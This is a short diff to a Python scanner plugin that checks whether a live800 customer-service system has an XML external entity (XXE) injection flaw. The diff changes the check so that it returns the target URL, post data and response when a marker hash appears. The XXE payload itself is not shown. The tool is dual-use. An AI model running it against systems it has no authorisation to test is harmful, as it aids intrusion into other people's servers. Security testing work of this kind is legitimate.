@@ -49,11 +49,13 @@ class live800_services_xxe_BaseVerify():
                 req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在live800在线客服系统XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
-                    noexist = False
+                    return True, vulnurl, "live800在线客服系统XML实体注入漏洞", post_data, req.text
             if noexist:
                 cprint("[-]不存在live800_services_xxe漏洞", "white", "on_grey")
+                return False, None, None, None, None
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 
 if __name__ == "__main__":
